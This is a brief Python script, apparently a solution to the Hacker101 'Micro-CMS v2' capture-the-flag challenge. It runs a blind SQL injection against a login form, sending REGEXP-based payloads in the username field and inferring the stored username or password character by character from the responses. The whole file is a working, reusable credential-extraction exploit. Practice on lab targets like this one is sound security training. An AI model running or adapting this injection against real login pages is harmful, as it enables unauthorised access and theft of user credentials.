# Login form blind SQL injection inference attack
# Micro-CMS v2
# https://ctf.hacker101.com/ctf
import requests

# Change the query to username or password to attack the desired field
field = 'username'
# HackerOne's uri change, enter the
uri = 'http://35.190.155.168:5001/79a579ef2f/login'


def get_char(known):
    for c in "0123456789abcdefghijklmnopqrstuvwxyz-_":
        tmp = known + c
        username = "' or " + field + " REGEXP '^" + tmp + ".*$"
        r = requests.post(uri, data={'username': username, 'password': ''})

        if 'Unknown user' not in r.text:
            known = tmp
            print tmp
            get_char(known)
            return
    print "Found " + field + ": " + known


get_char('')
